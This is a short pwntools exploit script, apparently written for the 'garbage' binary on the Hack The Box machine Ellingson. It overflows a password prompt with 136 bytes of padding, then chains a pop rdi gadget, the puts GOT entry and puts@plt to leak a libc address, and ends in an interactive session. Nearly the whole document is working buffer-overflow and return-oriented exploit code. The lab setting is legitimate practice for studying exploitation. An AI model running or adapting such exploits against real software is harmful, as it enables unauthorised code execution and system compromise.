from pwn import *

#p = process('/root/HTB/Ellingson/garbage')
p = gdb.debug('./garbage', 'b main')

context(os='linux', arch='amd64') #architecture

#401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>


plt_put = p64(0x401050) #procedure link table
got_put = p64(0x404028) #global offset table
pop_rdi = p64(0x40179b)
junk = "A"*136


#Enter access password: wnkdjx  

#access denied.



payload = junk + pop_rdi + got_put + plt_put


p.sendline(payload)
p.recvuntil("denied")
raw_input()
p.interactive()
